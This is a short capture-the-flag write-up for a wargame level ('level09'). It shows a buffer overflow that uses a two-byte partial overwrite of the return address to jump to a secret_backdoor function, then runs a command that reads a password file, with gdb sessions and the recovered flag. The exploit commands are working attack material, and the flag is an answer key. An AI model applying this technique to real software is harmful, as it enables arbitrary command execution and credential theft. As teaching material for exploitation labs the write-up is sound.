In the first buffer, it we write `\xca` 41 times, it will make the second fgets overflow the `handle_msg` buffer. It then segfaults on the eip of `handle_msg` and give us the ability to write it. The eip adress is almost the same as the `secret_backdoor` adress so we only need to write the 2 last bytes:
```shell
(gdb) r < <(python -c 'print "\xca" *41'; python -c 'print "B"*200 + "\x41\x41"')
...
Program received signal SIGSEGV, Segmentation fault.
0x0000555555554141 in ?? ()

(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>

(gdb) r < <(python -c 'print "\xca" *41'; python -c 'print "B"*200 + "\x8c\x48"')
...
sh: 1: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB: not found

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
```
We are then able to write a string which will be passed to `system`.
```shell
bash$ ./level09 < <(python -c 'print "\xca" *41'; python -c 'print "B"*200 + "\x8c\x48"'; echo "cat /home/users/end/.pass")
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
```
